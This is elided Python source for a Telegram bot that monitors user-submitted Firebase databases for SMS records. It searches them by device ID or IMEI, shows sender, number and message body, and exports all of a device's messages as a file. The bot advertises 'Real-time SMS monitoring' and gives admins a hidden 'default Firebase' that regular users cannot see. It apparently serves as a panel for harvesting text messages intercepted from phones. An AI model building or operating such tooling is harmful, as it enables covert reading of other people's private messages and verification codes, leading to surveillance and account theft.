...
def collect_all_records_by_device(snapshot, device_id, records=None):
    """Collect ALL records for a device ID"""
    if records is None:
        records = []
    
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            # Check if key matches device ID
            ...
            # Recursive search
            if isinstance(v, (dict, list)):
                collect_all_records_by_device(v, device_id, records)
    elif isinstance(snapshot, list):
        for v in snapshot:
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "DeviceId", "imei", "id"]
...
def get_unique_records(records):
    """Remove duplicate records based on JSON content"""
    unique = []
    seen = set()
    for rec in records:
...
def search_records_by_device(snapshot, device_id, limit=3):
    """Get first N unique records for a device ID"""
    all_records = collect_all_records_by_device(snapshot, device_id)
    unique_records = get_unique_records(all_records)
    return unique_records[:limit]

def format_device_record(rec, url=None, index=None):
    """Format a single record for display - NO DEFAULT FIREBASE LABEL"""
    lines = []
    if index is not None:
        lines.append(f"🔍 <b>Record #{index}</b>")
        lines.append("")
    if url:
        # Remove any "Default" label if present
        clean_url = url.replace(" (Default)", "").strip()
        lines.append(f"📌 URL: <code>{clean_url}</code>")
        lines.append("")
    
    # Show all important fields
    important_fields = ["device", "deviceId", "device_id", "imei", "id", "from", "sender", 
                        "address", "number", "message", "msg", "body", "text", "time", 
                        "timestamp", "date", "created_at", "phone", "mobile"]
    
    for k, v in rec.items():
        if any(field.lower() in k.lower() for field in important_fields):
            lines.append(f"<b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>")
    
    return "\n".join(lines)

def export_all_device_data(chat_id, device_id):
    """Export ALL data for a device ID as a text file"""
    ...
    for url in urls:
        ...
        if not snap:
            continue
        records = collect_all_records_by_device(snap, device_id)
        for rec in records:
            rec_key = json.dumps(rec, sort_keys=True, default=str)
            if rec_key not in url_sources:
                url_sources[rec_key] = url
...
def cache_refresher_loop():
    """Auto refresh cache every CACHE_REFRESH_SECONDS"""
    while True:
        try:
            now = time.time()
            # Refresh user URLs
            for chat_id, urls in list(firebase_urls.items()):
                for url in urls:
                    ...
                    if now - last_refresh >= CACHE_REFRESH_SECONDS:
                        ...
                        print(f"🔄 Auto-refreshed cache for user {chat_id}: {url}")
            
            # Refresh default Firebase (if active)
            if default_firebase_active:
                last_refresh = cache_time.get("__DEFAULT_FIREBASE__", {}).get(DEFAULT_FIREBASE_URL, 0)
                if now - last_refresh >= CACHE_REFRESH_SECONDS:
                    refresh_firebase_cache_single(None, DEFAULT_FIREBASE_URL, is_default=True)
                    print(f"🔄 Auto-refreshed default Firebase cache")
            
            time.sleep(60)  # Check every minute
        except Exception as e:
            print(f"Cache refresher error: {e}")
            time.sleep(60)
...
def handle_button_press(chat_id, text, is_admin=False):
    ...
    if text == "📋 My URLs":
        ...
        send_msg(chat_id, "🔍 Send me the Device ID to search\n\nExample: /find DEVICE_ID\n\nOnly first 3 UNIQUE results will be shown. No duplicates!", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_device"
        return True
    
    elif text == "📄 Export All Data":
        send_msg(chat_id, "📄 Send me the Device ID to export ALL data as a text file\n\nExample: /finda DEVICE_ID\n\nThis will export ALL UNIQUE records for that device.", keyboard=get_main_keyboard(is_admin))
        ...
        msg = (
            ...
            f"🌐 Total Active Users: {len(firebase_urls)}\n"
            f"📶 Download: {speed['download']}\n"
            f"⬆️ Upload: {speed['upload']}\n"
            f"📍 Ping: {speed['ping']}"
        )
        if is_admin:
            msg += f"\n\n👑 Default Firebase: {'Active' if default_firebase_active else 'Inactive'}"
            msg += f"\n👑 Total Monitors: {sum(len(u) for u in firebase_urls.values())}"
        send_msg(chat_id, msg, keyboard=get_main_keyboard(is_admin))
        return True
        ...
        if is_admin:
            help_msg = (
                ...
                "• /list - Your URLs\n"
                "• /find <id> - Search device (first 3 UNIQUE results)\n"
                "• /finda <id> - Export ALL device data as file\n"
                "• /ping - Status & speed\n"
                ...
                "📝 Send Firebase URL to start monitoring\nCache auto-refreshes every 20 min\nMax 5 URLs per user\n\n⚠️ Default Firebase results are NOT shown to regular users!"
            )
        else:
            help_msg = (
                "📚 <b>Help</b>\n\n"
                ...
                "📝 Send Firebase URL to start monitoring\nCache auto-refreshes every 20 min\nMax 5 URLs per user\n\n⚠️ Default Firebase results are NOT shown!"
            )
    ...
    # Admin panel buttons (continue from here...)
        ...
        stats = (
            ...
            f"📡 Active Monitors: {total_monitors}\n"
            f"🔗 Unique URLs: {len(used_firebase_urls)}\n"
            f"🚫 Blocked Devices: {len(blocked_devices)}\n"
            f"🌐 Default Firebase: {'Active' if default_firebase_active else 'Inactive'}\n"
            f"🔄 Cache Refresh: Every {CACHE_REFRESH_SECONDS//60} min"
        )
...
def handle_update(u):
    ...
    if text in ["📋 My URLs", "🔍 Find Device", "📄 Export All Data", "🔄 Refresh Cache", "🏓 Status", "🛑 Stop All", "❓ Help", "👑 Admin Panel",
    ...
    if lower_text == "/start":
        welcome_msg = (
            ...
            "📱 <b>Features:</b>\n"
            "• Real-time SMS monitoring (SSE + Auto-fallback)\n"
            "• Multiple Firebase URLs support (Max 5)\n"
            "• Device blocking\n"
            "• Search records by device ID (First 3 UNIQUE results - NO duplicates!)\n"
            "• Export ALL device data as text file\n"
            "• Auto cache refresh every 20 minutes\n\n"
            "🎯 <b>Quick Start:</b>\n"
            "• Send me a Firebase URL to start monitoring\n"
            "• Use the buttons below for easy access\n"
            "• Type /help for all commands\n\n"
            "⚠️ <b>Note:</b> Default Firebase results are NOT shown to regular users!"
        )
    ...
    # /finda - Export ALL data for device
    if lower_text.startswith("/finda"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /finda device_id\n\nOr use the 📄 Export All Data button\n\nThis will export ALL UNIQUE records for that device as a text file.", keyboard=get_main_keyboard(is_admin))
            return
        device = parts[1].strip()
        
        send_msg(chat_id, f"📤 Exporting all data for device: <code>{device}</code>\n\nThis may take a moment...", keyboard=get_main_keyboard(is_admin))
        ...
        if file_content is None:
            ...
            send_document(chat_id, file_content, filename, f"📄 Export for device: {device} - {len(file_content.split(chr(10)))} records")
            send_msg(chat_id, f"✅ Export complete! File sent above.\nTotal UNIQUE records exported.", keyboard=get_main_keyboard(is_admin))
        return
    
    # /find - Show first 3 UNIQUE results (NO DEFAULT FIREBASE)
    if lower_text.startswith("/find"):
        ...
        if not urls:
            send_msg(chat_id, "❌ No active URLs to search.\n\nPlease add a Firebase URL first!", keyboard=get_main_keyboard(is_admin))
            return
        
        # Collect all unique records from user's own URLs only
        all_matches = []
        seen_records = set()
        ...
        for url in urls:
            ...
            if not snap:
                continue
            records = collect_all_records_by_device(snap, device)
            for rec in records:
                rec_key = json.dumps(rec, sort_keys=True, default=str)
                if rec_key not in seen_records:
                    seen_records.add(rec_key)
                    all_matches.append((rec, url))
        
        # Get only first 3 unique records
        unique_results = all_matches[:3]
        
        if unique_results:
            total_count = len(all_matches)
            send_msg(chat_id, f"🔍 Found {total_count} UNIQUE record(s) for device: <code>{device}</code>\n\nShowing first {min(3, total_count)}:", keyboard=get_main_keyboard(is_admin))
            
            for idx, (rec, url) in enumerate(unique_results, 1):
                formatted = format_device_record(rec, url, idx)
                send_msg(chat_id, formatted, keyboard=get_main_keyboard(is_admin))
            
            if total_count > 3:
                send_msg(chat_id, f"📌 Found {total_count} total UNIQUE records. Use /finda {device} to export all data.", keyboard=get_main_keyboard(is_admin))
        else:
            send_msg(chat_id, f"🔍 No records found for device: <code>{device}</code>", keyboard=get_main_keyboard(is_admin))
        return
    
    # Firebase URL - ONLY for user's own URLs, DEFAULT FIREBASE IS BLOCKED
    if text.startswith("http"):
        # Block default Firebase for regular users
        if text == DEFAULT_FIREBASE_URL or text == normalize_json_url(DEFAULT_FIREBASE_URL):
            if not is_admin:
                send_msg(chat_id, "❌ Default Firebase is for admin only.\n\nPlease use your own Firebase URL.", keyboard=get_main_keyboard(is_admin))
                return
    ...
    if lower_text == "/help":
        if is_admin:
            help_msg = (
                ...
                "📝 Send Firebase URL to start monitoring\nCache auto-refreshes every 20 min\nMax 5 URLs per user\n\n⚠️ <b>IMPORTANT:</b> Default Firebase results are NOT shown to regular users!"
            )
        else:
            help_msg = (
                "📚 <b>Help</b>\n\n"
                ...
                "• /stop <url> - Stop specific\n"
                "• /list - Your URLs\n"
                "• /find <id> - Search device (first 3 UNIQUE results - NO duplicates!)\n"
                "• /finda <id> - Export ALL device data as file\n"
                "• /ping - Status & speed\n"
                "• /refresh [url] - Refresh cache\n"
                "• /help - This message\n\n"
...
# ---------- MAIN ----------
def main_loop():
    send_msg(OWNER_IDS, "🤖 Bot started with Keyboard Support!\n✅ SSE + Polling Active\n✅ Auto Cache Refresh Active (20 min)\n✅ NO duplicates in search results\n✅ Default Firebase hidden from regular users")
    print("=" * 50)
    print("🤖 BOT STARTED")
    print("✅ SSE + Polling Active")
    print(f"✅ Auto Cache Refresh: Every {CACHE_REFRESH_SECONDS//60} minutes")
    print(f"✅ Default Firebase: {'Enabled' if DEFAULT_FIREBASE_ENABLED else 'Disabled'}")
    print("✅ NO duplicate results in search")
    print("✅ Default Firebase hidden from regular users")
    print("=" * 50)
    global running
...
if __name__ == "__main__":
    try:
        ...
        cache_thread = threading.Thread(target=cache_refresher_loop, daemon=True)
        cache_thread.start()
